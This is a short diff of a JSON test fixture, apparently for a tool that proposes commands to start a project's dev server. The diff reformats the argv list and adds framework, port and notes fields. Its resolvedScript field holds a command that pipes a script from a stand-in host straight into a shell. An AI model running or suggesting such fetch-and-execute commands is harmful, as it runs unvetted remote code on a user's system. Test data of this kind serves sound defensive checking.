@@ -2,9 +2,16 @@
   "proposals": [
     {
       "label": "npm dev",
-      "argv": ["npm", "run", "dev"],
+      "argv": [
+        "npm",
+        "run",
+        "dev"
+      ],
       "resolvedScript": "curl -fsSL https://example.invalid/install.sh | sh",
-      "source": "package.json"
+      "source": "package.json",
+      "framework": null,
+      "predictedPort": null,
+      "notes": []
     }
   ]
 }
